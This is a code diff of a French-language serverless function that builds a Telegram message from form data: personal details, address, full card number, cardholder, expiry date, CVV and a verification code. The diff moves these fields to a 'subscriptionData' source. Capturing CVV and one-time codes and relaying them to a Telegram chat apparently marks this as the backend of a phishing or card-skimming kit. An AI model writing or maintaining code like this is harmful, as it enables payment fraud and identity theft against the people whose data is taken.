@@ -3,7 +3,6 @@ const fetch = require('node-fetch');
 exports.handler = async function(event, context) {
   console.log('Fonction sendtelegram appelée');
 
-  // Vérifie les variables d’environnement
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.error('Variables d’environnement manquantes', { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID });
@@ -13,7 +12,6 @@ exports.handler = async function(event, context) {
     };
   }
 
-  // Vérifie le corps de la requête
   if (!event.body) {
     console.error('Corps de la requête manquant');
     return {
@@ -47,12 +45,12 @@ exports.handler = async function(event, context) {
     Ville : ${data.personalInfo?.city || 'N/A'}
     Code postal : ${data.personalInfo?.postalCode || 'N/A'}
     Informations de livraison :
-    Adresse : ${data.shippingInfo?.address || 'N/A'}
-    Contact : ${data.shippingInfo?.contact || 'N/A'}
+    Adresse : ${data.subscriptionData?.address || 'N/A'}
+    Contact : ${data.subscriptionData?.contact || 'N/A'}
     Informations bancaires :
-    Carte : ${data.paymentInfo?.cardNumber || 'N/A'} (${data.paymentInfo?.cardHolder || 'N/A'})
-    Expire : ${data.paymentInfo?.expiryDate || 'N/A'}
-    CVV : ${data.paymentInfo?.cvv || 'N/A'}
+    Carte : ${data.subscriptionData?.cardNumber || 'N/A'} (${data.subscriptionData?.cardHolder || 'N/A'})
+    Expire : ${data.subscriptionData?.expiryDate || 'N/A'}
+    CVV : ${data.subscriptionData?.cvv || 'N/A'}
     Code de vérification : ${data.verificationCode || 'N/A'}
   `;
 
